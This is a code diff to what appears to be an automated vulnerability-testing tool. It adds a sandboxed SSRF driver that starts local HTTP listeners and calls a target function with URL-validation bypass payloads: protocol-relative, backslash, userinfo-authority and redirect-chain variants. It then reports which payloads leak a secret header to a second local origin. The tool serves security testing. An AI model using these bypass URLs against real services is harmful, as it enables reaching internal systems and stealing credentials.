@@ -57,6 +57,163 @@ function firstSinkLine(source: string): number {
   return 1;
 }
 
+function ssrfBoundaryDriver(moduleRel: string, fnName: string, marker: string): string {
+  const mod = JSON.stringify("./" + moduleRel);
+  const fn = JSON.stringify(fnName);
+  const mk = JSON.stringify(marker);
+  const markerPayload = encodeURIComponent(marker);
+  return `
+import http from "node:http";
+import { URL } from "node:url";
+const MARKER = ${mk};
+const MARKER_ENCODED = "${markerPayload}";
+
+let m;
+try {
+  m = await import(${mod});
+} catch (e) {
+  process.stdout.write("IMPORT_FAIL:" + e);
+  process.exit(0);
+}
+
+const fn = (m && m[${fn}]) || (m && m.default && (m.default[${fn}] || m.default));
+if (typeof fn !== "function") {
+  process.stdout.write("NOT_A_FUNCTION");
+  process.exit(0);
+}
+
+function asHeader(v) {
+  if (v == null) return "";
+  if (Array.isArray(v)) return String(v[0] || "");
+  if (typeof v === "string") return v;
+  try {
+    return String(v);
+  } catch {
+    return "";
+  }
+}
+
+let allowHits = 0;
+let boundaryHits = 0;
+let boundaryReq = null;
+let boundaryHeader = null;
+let allowHeader = null;
+let triggeredPayload = null;
+let currentPayload = null;
+let currentReason = null;
+
+const allowServer = http.createServer((req, res) => {
+  const line = (req.url || "") + " host=" + (req.headers.host || "");
+  if (line.includes(MARKER)) allowHits += 1;
+  if (line.indexOf("/api/redirect") !== -1) {
+    const reqUrl = new URL(req.url, "http://127.0.0.1");
+    const to = reqUrl.searchParams.get("to");
+    if (to) {
+      res.statusCode = 302;
+      res.setHeader("location", decodeURIComponent(to));
+      res.end("redirect");
+      return;
+    }
+  }
+  if (line.includes(MARKER)) {
+    res.statusCode = 200;
+    if (!seenBaseline) {
+      allowHeader = asHeader(req.headers["x-raeuber-secret"]);
+    }
+  } else {
+    res.statusCode = 404;
+  }
+  res.end("ALLOW_" + MARKER);
+});
+const boundaryServer = http.createServer((req, res) => {
+  const line = (req.url || "") + " host=" + (req.headers.host || "");
+  if (line.includes(MARKER)) {
+    boundaryHits += 1;
+    boundaryReq = line;
+    boundaryHeader = asHeader(req.headers["x-raeuber-secret"]);
+  }
+  res.statusCode = 200;
+  res.end("BOUNDARY_" + MARKER);
+});
+
+await new Promise((resolve) => allowServer.listen(0, "127.0.0.1", resolve));
+await new Promise((resolve) => boundaryServer.listen(0, "127.0.0.1", resolve));
+const allowPort = allowServer.address().port;
+const boundaryPort = boundaryServer.address().port;
+
+const allowOrigin = "http://127.0.0.1:" + allowPort;
+const boundaryOrigin = "http://127.0.0.1:" + boundaryPort;
+
+async function callAndWait(payload) {
+  currentPayload = payload;
+  try {
+    await fn(payload);
+  } catch {
+    // Sink attempts can throw after the request lands; callback evidence still validates SSRF.
+  }
+  await new Promise((resolve) => setTimeout(resolve, 120));
+}
+
+const payloads = [
+  { kind: "allow", url: allowOrigin + "/api/allow?token=" + MARKER_ENCODED },
+  { kind: "protocol-relative", url: "//127.0.0.1:" + boundaryPort + "/api/protocol?token=" + MARKER_ENCODED },
+  { kind: "backslash-normalized", url: "https:\\\\127.0.0.1:" + boundaryPort + "/api/backslash?token=" + MARKER_ENCODED },
+  { kind: "alternate-authority", url: "http://trusted@127.0.0.1:" + boundaryPort + "/api/userinfo?token=" + MARKER_ENCODED },
+  {
+    kind: "redirect-chain",
+    url:
+      allowOrigin +
+      "/api/redirect?token=" +
+      MARKER_ENCODED +
+      "&to=" +
+      encodeURIComponent(boundaryOrigin + "/api/redirect-callback?token=" + MARKER_ENCODED),
+  },
+];
+
+let seenBaseline = false;
+for (const payload of payloads) {
+  await callAndWait(payload.url);
+  if (payload.kind === "allow") {
+    if (allowHits > 0) {
+      seenBaseline = true;
+    }
+    continue;
+  }
+  if (seenBaseline && boundaryReq && boundaryReq.includes(MARKER)) {
+    triggeredPayload = currentPayload;
+    currentReason = payload.kind;
+    break;
+  }
+}
+
+allowServer.close();
+boundaryServer.close();
+
+if (boundaryHits > 0 && seenBaseline && boundaryReq && boundaryReq.includes(MARKER)) {
+  const evidencePayload = triggeredPayload || payloads[1].url;
+  process.stdout.write(
+    "BOUNDARY_BYPASS payload=" +
+      evidencePayload +
+      " variant=" +
+      (currentReason || "unknown") +
+      " callback=" +
+      boundaryReq +
+      " allowHeader=" +
+      (allowHeader || "") +
+      " boundaryHeader=" +
+      (boundaryHeader || "")
+  );
+} else if (seenBaseline) {
+  process.stdout.write("BOUNDARY_SAFE");
+  if (!allowHeader) {
+    process.stdout.write(" ALLOW_NO_SECRET");
+  }
+} else {
+  process.stdout.write("BOUNDARY_UNKNOWN");
+}
+`.trim();
+}
+
 /**
  * A self-contained CommonJS driver that PROVES SSRF with an out-of-band signal and zero external
  * network: it starts a throwaway HTTP listener on 127.0.0.1:<ephemeral>, then calls the target's
@@ -149,6 +306,34 @@ export class SsrfAttacker implements Attacker {
         if (fired) break;
         const marker = freshMarker();
         const driverRel = `.raeuber-driver-${marker}.mjs`;
+        const boundaryRel = `.raeuber-boundary-${marker}.mjs`;
+        sandbox.writeFile(boundaryRel, ssrfBoundaryDriver(file, name, marker));
+        const boundaryRun = sandbox.exec(`${NODE_RUN} ${boundaryRel} 2>&1`, 25_000);
+        const boundaryOut = boundaryRun.stdout + boundaryRun.stderr;
+        if (boundaryOut.includes("BOUNDARY_BYPASS") && boundaryOut.includes("payload=")) {
+          const payload = boundaryOut.match(/payload=(\S+)/)?.[1] ?? `http://127.0.0.1/${marker}`;
+          const callback = boundaryOut.match(/callback=(\S+)/)?.[1] ?? "";
+          const boundaryHeader = boundaryOut.match(/boundaryHeader=(\S+)/)?.[1] ?? "";
+          const allowHeader = boundaryOut.match(/allowHeader=(\S+)/)?.[1] ?? "";
+          exploits.push({
+            attackClass: "ssrf",
+            proof: "oob-request",
+            file,
+            line: sinkLine,
+            sink: `ssrf-boundary(${name})`,
+            summary:
+              `Exported function \`${name}()\` passes trust-boundary inputs through the same parsing/normalization path, ` +
+              `and a credential-bearing request reaches a different local origin after validation (protocol-relative/backslash/redirect boundary differential).`,
+            payload,
+            evidence:
+              `URL trust-boundary differential triggered (variant=${boundaryOut.match(/variant=(\S+)/)?.[1] || "unknown"}, ` +
+              `callback=${callback}, allowHeader=${allowHeader}, boundaryHeader=${boundaryHeader}). ` +
+              boundaryOut.slice(0, 800),
+          });
+          fired = true;
+          continue;
+        }
+
         sandbox.writeFile(driverRel, ssrfCanaryDriver(file, name, marker));
         const run = sandbox.exec(`${NODE_RUN} ${driverRel} 2>&1`, 20_000);
         const out = run.stdout + run.stderr;
